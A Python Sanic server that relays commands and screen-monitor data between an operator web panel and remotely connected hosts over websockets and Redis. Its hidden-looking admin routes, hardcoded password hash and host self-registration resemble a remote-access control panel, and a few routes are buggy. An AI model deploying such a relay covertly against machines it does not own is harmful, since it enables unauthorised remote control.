from sanic import Sanic, response
from sanic_jinja2 import SanicJinja2
from jinja2 import PackageLoader, select_autoescape
from sanic_session import InMemorySessionInterface, RedisSessionInterface
import aioredis
import asyncio
import json, logging
import traceback as tb
import websockets
import hashlib
from functools import wraps
logging.basicConfig(level = logging.INFO,format = '%(asctime)s - %(name)s - %(filename)s[%(lineno)d] - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

jinja = SanicJinja2(
    loader=PackageLoader('templates'),
    autoescape=select_autoescape(['html', 'xml']),
)

app = Sanic(__name__)
app.static('/static', './static')


class _Redis(aioredis.Redis):
    def delete(self, key, *keys):
        if not isinstance(key, (tuple, list)):
            key = [key]
        return super().delete(*(key+list(keys)))

class Redis:
    _pool = None
    async def get_redis_pool(self):
        if not self._pool:
            self._pool = await aioredis.create_redis_pool(
                address=('localhost', 6379), db=0, minsize=1,
                maxsize=20, commands_factory=_Redis
            )
        return self._pool

    async def close(self):
        if self._pool:
            self._pool.close()
            await self._pool.wait_closed()
            self._pool = None

redis = Redis()

session_interface = RedisSessionInterface(redis.get_redis_pool)
# session_interface = InMemorySessionInterface()

### utils
def to_bytes(s, encoding='utf-8'):
    if isinstance(s, str):
        s = s.encode(encoding)
    return s

def to_str(s, encoding='utf-8'):
    if isinstance(s, bytes):
        s = s.decode(encoding)
    return str(s)

def get_hash(s, method=hashlib.sha256):
    return method(to_bytes(s)).hexdigest()

async def login(info, ws):
    id = info.get('login', '')
    pcname = info.get('pcname', '')
    mac = info.get('mac', '')
    if get_hash( pcname + mac + "qsefthuko" ) != id:
        return False
    logging.info('login in host[%s]', id)
    await ws.send(json.dumps({'code':200}))
    pool = await redis.get_redis_pool()
    await pool.set('rdpinfo-%s'%id, json.dumps(info))
    return True

async def logout(id):
    pool = await redis.get_redis_pool()
    await pool.delete('rdpinfo-%s'%id)

### end utils

### app listener
@app.listener('before_server_start')
async def server_init(app, loop):
    jinja.init_app(app)

@app.listener('before_server_stop')
async def notify_server_stopping(app, loop):
    await redis.close()

### end app listener

### middleware
@app.middleware('request')
async def add_session_to_request(request):
    await session_interface.open(request)

@app.middleware('response')
async def save_session(request, response):
    try:
        await session_interface.save(request, response)
    except:
        pass

### end middleware

### decorator
def login_required(view_func):
    @wraps(view_func)
    async def wrapper(request, *args, **kw):
        if not request['session']['login']:
            return response.redirect(login_view)
        return await view_func(request, *args, **kw)
    return wrapper
### end decorator

### view 
@app.route('/cqmygysdss/login', methods=['GET', 'POST'])
@jinja.template('login.html')
async def login_view(request):
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        if get_hash(username+password) == '812cb8b13877fb4008bd85c4b8986d104480c17aed135cf4c63b873d804509a5':
            request['session']['login']=True
            return response.redirect('/controllist-jtwmydtsgx/')

@app.route('cqmygysdss/logout')
async def logout_view(request):
    request['session']['login']=False
    return response.redirect('/cqmygysdss/login')

@app.route('/controllist-jtwmydtsgx/')
@jinja.template('controllist.html')
@login_required
async def controllist(request):
    pool = await redis.get_redis_pool()
    keys = await pool.keys('rdpinfo-*')
    tr = pool.multi_exec()
    [tr.get(key) for key in keys]
    result = await tr.execute()
    return {'data': [json.loads(res.decode()) for res in result]}


@app.route('/control-jtwmydtsgx/<id>')
@app.route('/control-jtwmydtsgx/')
@jinja.template('control.html')
@login_required
async def control(request, id='96d588f8f38a49032e096b230d6651616b92682700cac320fbf99a884d58333f'):
    return locals()

@app.route('/api/info/<id>')
@login_required
async def info(request, id):
    pool = await redis.get_redis_pool()
    info = await pool.get('rdpinfo-%s'%id)
    if not info:
        return response.json({'code': 404})
    info = json.loads(info)
    return response.json({'code': 200, 'data': info})
### end view

### websocket
@app.websocket('/websocket/host')
async def host(request, ws):
    line = await ws.recv()
    info = json.loads(line)
    id = info.get('login')
    log = await login(info, ws)
    if not log: return
    pool = await redis.get_redis_pool()
    
    async def pipe():
        while True:
            try:
                data = await ws.recv()
                await pool.publish('monitor-%s'%id, data)
            except websockets.exceptions.ConnectionClosed as e:
                # logger.error(tb.format_exc())
                break

    handler = asyncio.ensure_future(pipe())
    channel = (await pool.subscribe("command-%s"%id))[0]
    while True:
        try:
            command = await channel.get()
            if command is not None:
                await ws.send(command.decode())
            else:
                break
        except websockets.exceptions.ConnectionClosed as e:
            # logger.error(tb.format_exc())
            break
    await pool.unsubscribe("command-%s"%id)
    await logout(id)
    handler.cancel()

@app.websocket('/websocket/manage')
@login_required
async def manage(request, ws):
    id = request.args.get('id')
    pool = await redis.get_redis_pool()
    info = await pool.get('rdpinfo-%s'%id)
    if not info:
        return
    async def pipe():
        while True:
            try:
                data = await ws.recv()
                await pool.publish('command-%s'%id, data)
            except websockets.exceptions.ConnectionClosed as e:
                # logger.error(tb.format_exc())
                break
    handler = asyncio.ensure_future(pipe())
    channel = (await pool.subscribe("monitor-%s"%id))[0]
    while True:
        try:
            monitor = await channel.get()
            if type(monitor) is bytes:
                await ws.send(monitor)
            else:
                break
        except websockets.exceptions.ConnectionClosed:
            # logger.error(tb.format_exc())
            break
    await pool.unsubscribe("monitor-%s"%id)
    monitors = await pool.pubsub_numsub("monitor-%s"%id)
    monitors = monitors.get("monitor-%s"%id, 0)
    if monitors == 0:
        try:
            await pool.publish('command-%s'%id, '{"action":"stop_monitor"}')
        except:
            logger.error(tb.format_exc())
    logger.info("monitor remains: [%s]", str(monitors))
    handler.cancel()

### end websocket

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=800)